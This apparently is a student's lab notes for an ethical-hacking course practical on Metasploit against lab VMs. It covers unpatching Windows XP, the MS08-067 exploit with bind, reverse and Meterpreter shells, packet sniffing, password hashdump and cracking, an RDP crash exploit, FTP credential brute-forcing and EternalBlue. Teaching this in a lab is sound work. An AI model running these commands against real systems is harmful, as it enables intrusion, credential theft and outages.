# EHD Practical 10 - Metasploit

###### tags: #EHD 

## Table of Contents
```toc
```

## Setting Up a Target Vulnerable to MS08-067
**On Host PC**
1. Search the Internet for information about the Microsoft Security Bulletin MS08-067 and take note of the 6-digit knowledge base number
2. For this practical, the WinXP VM  is required

**On WinXP VM**
3. Go to the Control Panel and **Add or Remove Programs**
4. Check the box **Show Updates**. The list of installed programs and software updates will be displayed
5. Search the list of security updates for ones containing the Knowledge Base numbers 958644  or 2705219 of the MS08-067 or MS12-054 security bulletins. If the updates are listed on WinXP, remove them and restart the computer

> If not, WinXP is not patched against the MS08-067 vulnerability

6. Go to the Control Panel > Security Center
7. Under Manage Security Settings, select **Windows Firewall** and turn it off. The WinXP is now a vulnerable target

## Using the Metasploit Console
**On Kali VM**
> <u>Activating the Metasploit console:</u>
> - Click the Kali icon > 08 Exploitation Tools > Metasploit framework
> - Run `msfconsole` on the terminal

- To see all possible commands, type `help` at the `msf` prompt
- To see list of exploits, type `show exploits`
	- List of exploits and CVE numbers will be displayed
- To search for exploits related to SMB, type `search smb`
- To search for exploits related to MS08-067, type `search ms08_067`

1. Look for info on the exploit `ms08_067_netapi` and use it
```
info windows/smb/ms08_067_netapi
use windows/smb/ms08_067_netapi
```
2. At the exploit prompt, type `show options`
3. Set a remote host to target (RHOST)
```
set RHOST WinXP-IP
```
4. Type `show options` to view the RHOST set
5. To check which payloads can be used for a certain exploit, type the following command:
```
show payloads
```
6. View info on the payload `windows/shell/bind_tcp` and set it:
```
info windows/shell/bind_tcp
set windows/shell/bind_tcp
```
7. Type `show options` to view the options set for the payload
8. Run the exploit:
```
exploit
```

> If the exploit is successful, a remote connection will be established to the command prompt of the Windows XP VM
> - Run `dir` to list all files on the remote target
> - Type `set` to see list of current environment variables
> - To create a new user: `net user username password /add`

9. To quit from the remote connection, press <kbd>Ctrl</kbd>+<kbd>C</kbd>

## Using Reverse TCP Payload
> In the previous exploit, Kali creates a connection to the unpatched WinXP, but if the firewall on WinXP is enabled, Kali is unable to connect to WinXP
> To address this problem, the payload `reverse_tcp` tells the victim to connect to the attacker (Kali VM) as WinXP as WinXP is the one initiating the connection, hence the firewall will allow it

**On Kali VM**
1. Set the payload to `reverse_tcp`
```
set payload windows/shell/reverse_tcp
```
2. Type`show options` to see the options set
3. Specify the listening host (LHOST) that the victim should connect to
```
set LHOST Kali-IP
```
4. Run the exploit:
```
exploit
```

**On WinXP VM**
5.  On the Command Prompt, type the following to <u>view the connection Metasploit has made to the attacker system:</u>
```
netstat -an
```

## Using VNC Payload
**On Kali VM**
1. Try the exploit with the following payload:
```
set payload windows/vncinject/reverse_tcp
```
2. Type `show options` to see options set
3. Run the exploit
```
exploit
```

## Using Meterpreter
**On Kali VM**
1. Try the exploit with the following payload:
```
set payload windows/meterpreter/reverse_tcp
```
2. Type  `show options` to see options set
3. Run the exploit
```
exploit
```
4. Type `help` at the Meterpreter prompt to see all available commands
5. Type `ps` to see list of processes running on the WinXP VM
6. Type `screenshot` to take a screenshot of the WinXP VM (File is saved to a file on Kali)
7. Type `ifconfig` to list the network interfaces on the WinXP VM
8. To see all possibilities for Meterpreter scripts on Kali, type `run` and press <kbd>Tab</kbd> twice
9. To see all possibilities for Meterpreter extension modules on Kali, type `use` and press <kbd>Tab</kbd> twice
10. Type `use sniffer` to load the load the sniffer extension to do network packet capturing on the WinXP VM
11. Type `sniffer_start 2` (where 2 is the interface number of the VMWare network adapter)

**On WinXP VM**
12. Do some network activity e.g. pinging another system or browsing the Internet

**On Kali VM**
13. Type `sniffer_stats 2` to see statistics on the number of packets and bytes captured so far
14. Type `sniffer_dump 2 /tmp/winxp.cap` to save the captured packets into a file `/tmp/winxp.cap`
15. View the captured packet file using Wireshark

## Use Metasploit Meterpreter to Get Password Dump
> Use Meterpreter to dump out password hashes from the target

**On WinXP VM**
1. Go to the Control Panel > Performance and Maintenance > Admin Tools > Computer Management
2. Under Computer Management, System Tools > Local Users and Groups > Users
3. Right-click and select **New User** and create new accounts with passwords

**On Kali VM**
4. Using Metasploit, exploit WinXP with the Meterpreter payload
5. At the Meterpreter prompt, type `hashdump` to display a dump of the user accounts and hashed passwords of WinXP
6. Copy the list of user accounts and hashed passwords into a text file
7. Use John the Ripper to crack the hashed passwords
```
sudo john filename.txt
```

## Exploiting Remote Desktop
**On Host PC**
1. Search the Internet for information about the Microsoft Security Bulletin MS12-020 and take note of its Knowledge Base number

**On Win2008 VM**
2. Go to Start > Admin Tools > Services and enable **Remote Desktop Services**
3. Go to Start > right-click Computer > Properties
4. Click on Remote settings and select **Allow connections from computers running any version of Remote Desktop**
5. On Command Prompt, type `netstat -an` and see if Port 3389 is open (Remote Desktop runs on Port 3389 by default)
6. Go to Windows Firewall with Advanced Security and check that the Inbound Rule to allow Remote Desktop connections to TCP Port 3389 is enabled
7. Go to Control Panel > Programs > View Installed Updates and check the list of security updates containing the Knowledge Base number for the MS12-020 security bulletin
8. If the patch is listed, remove and start the Win2008 VM
9. If not, Win2008 is not patched against this vulnerability

**On Kali VM**
10. On Metasploit, search for exploits related to MS12-020:
```
search ms12_020
```
11. Select the exploit
```
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
```
12. Set Win2008 as the RHOST
```
set RHOST Win2008-IP
```
13.  Type `show options` to view the set options
14. Run the exploit
```
exploit
```
15. The Blue Screen of Death appears in the Win2008 VM (refresh the image to get rid of the BSOD)

## Viewing Available Metasploit Modules
1. List the type of modules available for Metasploit:
```
ls /usr/share/metasploit-framework/modules
```
2.  To add new modules, copy them to the corresponding directories and restart the Metasploit framework to reload all the modules

## Using Metasploit to Scan for Versions of Microsoft Windows
**On Kali VM**
1. On Metasploit, view the information for the `smb_version`  module and select it
```
info auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_version
```
2. Type `show options` to see the options that need to be set
3. Set WinXP and Win2008 VMs as the remote hosts (RHOSTS)
```
set RHOSTS WinXP-IP Win2008-IP
```
4. If scanning a large number of hosts, increase the number concurrently to the number of hosts to be scanned (in the example, 2)
```
set THREADS 2
```
5. Run the scan
```
run
```

> On Host PC, power on the web-server2 VM which has a FTP server running on it

**On Kali VM**
6. On Metasploit, view the information about the `ftp_version` module and select it
```
info auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_version
```
7. Type `show options` to view options to be set
8. Set web-server2 VM as the remote host
9. In another terminal, create a file `/tmp/ftpuserlist` that contains possible FTP usernames
```
user 
student
student00
anonymous
```
10. In the terminal, create a file `/tmp/ftppasslist` that contains possible FTP passwords
```
password
12345678
student
student00
```
11. Back in Metasploit, set it to use the username and password files just created:
```
set USER_FILE /tmp/ftpuserlist
set PASS_FILE /tmp/ftppasslist
```
12. Run the scan:
```
run
```

## EternalBlue and Mimikatz
> EternalBlue is the name of an exploit for a software vulnerability in Microsoft's Windows OS and targets the SMB service in Windows

**On Win2008 VM**
1. Configure the Windows Firewall with Advanced Security to allow incoming connections to File and Printer Sharing (SMB-In)

**On Kali VM**
2. In a terminal, search in the following directory for the appropriate exploit for the EternalBlue vulnerability
```
/usr/share/metasploit-framework/modules/exploits
```
3. On Metasploit, search for exploits for the EternalBlue vulnerability
```
use exploit/windows/smb/ms17_010_eternalblue
```
4. Set the remote host (RHOST) to the Win2008 VM IP
```
set RHOST Win2008-IP
```
5. Set payload to `windows/x64/exec` (If successful, it can run any one command on the target)
```
set payload windows/x64/exec
```
6. Set a command to run on the target:
```
set CMD command
```
7. Run the exploit
```
exploit
```

> Kiwi or Mimikatz 2.0 is a post exploitation tool that may be able to get passwords from vulnerable Windows systems

**On Win2008 VM**
1. Login as Administrator
2. On Metasploit, using the same EternalBlue exploit and RHOST (Win2), set the payload to the following:
```
windows/x64/meterpreter/reverse_tcp
```
3. Set the listening host (LHOST) to Kali IP
```
set LHOST Kali-IP
```
5. Run the exploit 
```
exploit
```